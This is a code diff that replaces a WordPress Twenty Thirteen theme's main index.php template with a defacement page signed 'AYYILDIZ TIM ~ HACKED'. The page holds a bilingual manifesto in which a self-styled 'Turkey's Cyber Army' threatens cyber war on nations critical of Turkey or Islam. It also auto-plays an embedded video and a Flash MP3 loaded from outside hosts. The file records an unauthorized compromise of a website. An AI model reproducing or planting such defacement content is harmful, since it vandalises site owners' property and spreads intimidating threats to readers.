@@ -1,38 +1,19 @@
-<?php
-/**
- * The main template file.
- *
- * This is the most generic template file in a WordPress theme and one of the
- * two required files for a theme (the other being style.css).
- * It is used to display a page when nothing more specific matches a query.
- * For example, it puts together the home page when no home.php file exists.
- *
- * Learn more: http://codex.wordpress.org/Template_Hierarchy
- *
- * @package WordPress
- * @subpackage Twenty_Thirteen
- * @since Twenty Thirteen 1.0
- */
 
-get_header(); ?>
+<html><head><meta http-equiv="Content-Type" content="text/html; charset=windows-1254"><!-- HER HAKKI AY YILDIZ'AYiTTIR --><title>AYYILDIZ TIM ~ HACKED</title><script src="/Scripts/AC_ActiveX.js" type="text/javascript"></script><script src="/Scripts/AC_RunActiveContent.js" type="text/javascript"></script><style type="text/css"><style type="text/css">*,body,div,p,span,h6{padding: 0px;margin: 0px;}body{background-color: #000000;}img{border-width: 0px;-ms-interpolation-mode: bicubic;}.wrapper{margin: 50px 0px 10px 0px;font-family: tahoma;font-size: 12px;font-weight: bold;}.wrapper h6{color: #C0C0C0;font-size: 12px;text-shadow:1px 2px 3px #C0C0C0;}.wrapper p{color: #FF0000;padding:5px;}#box{color: #FF0000;text-shadow:1px 2px 3px #FF0000;}#love{color: #008000;text-shadow:1px 2px 3px #008000;}#ashiyane{color: #FF0000;text-shadow:1px 2px 3px #FF0000;}#greetz{color: #FF9933;text-shadow:1px 2px 3px #FF9933;}#defacer{color: #FF0000;text-shadow:1px 2px 3px #FF0000;}.image{border-width: 0px;background-image: url('http://www.ashiyane.ir/images/tilesash.jpg');background-repeat: repeat-x;background-position: center center;height: 266px;width: 100%;}/* Coding by: eymen */</style></head><body bgcolor="#000000" topmargin="1"><div align="center"><center><table border="0" cellpadding="0" cellspacing="0" style="border-collapse: collapse" bordercolor="#FFFFFF" width="806" height="1662"><tr><td width="14" height="1662" background="http://s10.directupload.net/images/101021/jhwigw2n.png"></td><td width="778" height="1662" valign="top"><div align="center"><center><table border="0" cellpadding="0" cellspacing="0" style="border-collapse: collapse"><tr> <td width="778" height="424"> <img src="http://i53.tinypic.com/vwtqna.jpg" width="780" height="350"><br></td></tr><tr> <td width="778" height="1" valign="top"><p align="center" dir="ltr"> <img border="0" src="http://s7.directupload.net/images/101021/mw22h48t.png" width="778" height="7"></td></tr><tr><td width="778" height="346" valign="top"><p align="center" dir="ltr"> <b><font color="#CC0000" face="Tahoma" style="font-size: 15pt">ABOUT AYYILDIZ TEAM?</font><font color="#FFFFFF" face="Tahoma"><br></font></b> <img border="0" src="http://s7.directupload.net/images/101021/mw22h48t.png" width="778" height="7"></p><span class="style1"><div class="wrapper"><center><h6><b> - ahmetbslk - </b></h6></center><p align="center" dir="ltr"><font color="#FFFFFF" face="Trebuchet MS"><span style="font-size: 13pt">We are Turkey's Cyber Army.</span></font></p><p align="center" dir="ltr"><font color="#FFFFFF" face="Trebuchet MS"><span style="font-size: 13pt">For the sake of our country , we will continue fighting against the enemies in virtual world as we do in real world under all heavy circumstances such as winter,cold and snow</span></font><font color="#FFFFFF" face="Trebuchet MS"><span style="font-size: 13pt">..</span></font></p><p align="center" dir="ltr"><font color="#FFFFFF" face="Trebuchet MS"><span style="font-size: 13pt">We are never tired and we will never give up !We always support each other and we are always together in good times and bad times.We will declare Cyber War against all the nations having negative ideas about Turkey and our religion Islam.If you insist on these ideas ,get ready for cyber war !We aren't afraid of anybody and we will give our answer back where necessary. <br><br><br>AYYILDIZ TEAM<br> <br><center><p id="greetz">Vatanini En Cok Seven Gorevini En Iyi Yapandir.<br/>TURKEY'S CYBER ARMY</span></center><br> </font>&nbsp; </p></td></tr> <tr> <td width="778" height="1" valign="top"><img border="0" src="http://s7.directupload.net/images/101021/mw22h48t.png" width="778" height="7"></td></tr><tr> <td width="778" height="349" valign="top"><p align="center" dir="ltr"> <font color="#FFFFFF" face="Verdana" size="2"><br></font> <font color="#FFFFFF" face="Trebuchet MS" style="font-size: 13pt"><br>Biz T&#252;rkiye'nin sanal ordusuyuz.<br> Vatanimiz i&#231;in d&#252;smanlar ile sogukta, karda, kista nasil savasiyorsak sanal alemde de vatanimiz ugruna savasiriz.<br>Asla yorulmaz. Asla pes etmeyiz. Birbirimizi destekler, iyi g&#252;nde k&#246;t&#252; g&#252;nde hep bir oluruz.<br> Dinimize ve T&#252;rkiye'ye karsi koyacak fikirlere sahip olan t&#252;m devletlere sanal savas a&#231;ilcaktir.<br> Bu k&#246;t&#252;; fikirlere devam edecekseniz sanal savasa hazirlikli olun! Kimseden korkmayiz!<br>Gerektigi yerde gereken cevabi veririz!<br><br><br>AYYILDIZ TiM<br><br>TURKiYE'NiN SiBER ORDUSU</span><br></font><font color="#FFFFFF" face="Verdana" size="2">&nbsp;</font></p></td></tr> <tr> <td width="778" height="10"><img border="0" src="http://s7.directupload.net/images/101021/mw22h48t.png" width="778" height="7"></td></tr> <tr> <td width="778" height="293" valign="top"><p align="center"> <iframe title="YouTube video player" class="youtube-player" type="text/html" width="661" height="373" src="http://www.youtube.com/embed/JrcdH5qfNZA" autoplay="1" frameborder="0" allowFullScreen></iframe> &nbsp;</td></tr><tr> <td width="778" height="11" valign="top"><img border="0" src="http://s7.directupload.net/images/101021/mw22h48t.png" width="778" height="7"></td></tr><tr><td width="778" height="23" valign="middle"><p align="center"><b><font face="Verdana" size="2" color="#FFFFFF">AY YILDIZ -2011</font></b></td></tr></table></center></div></td><td width="12" height="1662" background="http://s10.directupload.net/images/101021/jhwigw2n.png"></td></tr></table></center></div></body></html>
+<p>
 
-	<div id="primary" class="content-area">
-		<div id="content" class="site-content" role="main">
-		<?php if ( have_posts() ) : ?>
+    <object type="application/x-shockwave-flash" data="http://flash-mp3-player.net/medias/player_mp3.swf" width="200" height="20">
 
-			<?php /* The loop */ ?>
-			<?php while ( have_posts() ) : the_post(); ?>
-				<?php get_template_part( 'content', get_post_format() ); ?>
-			<?php endwhile; ?>
+      <param name="movie" value="http://flash-mp3-player.net/medias/player_mp3.swf">
 
-			<?php twentythirteen_paging_nav(); ?>
+      <param name="bgcolor" value="#333333">
 
-		<?php else : ?>
-			<?php get_template_part( 'content', 'none' ); ?>
-		<?php endif; ?>
+      <param name="FlashVars" value="mp3=http://kodyazalim.bedavahost.biz/turk.mp3&amp;autoplay=1&amp;bgcolor=333333&amp;bgcolor1=333333&amp;loadingcolo
 
-		</div><!-- #content -->
-	</div><!-- #primary -->
 
-<?php get_sidebar(); ?>
-<?php get_footer(); ?>
+
+r=333311&amp;buttoncolor=fffff0&amp;buttonovercolor=ff0040&amp;slidercolor1=fffff0&amp;sliderovercolor=c70000">
+
+    </object>
+
+  </p>
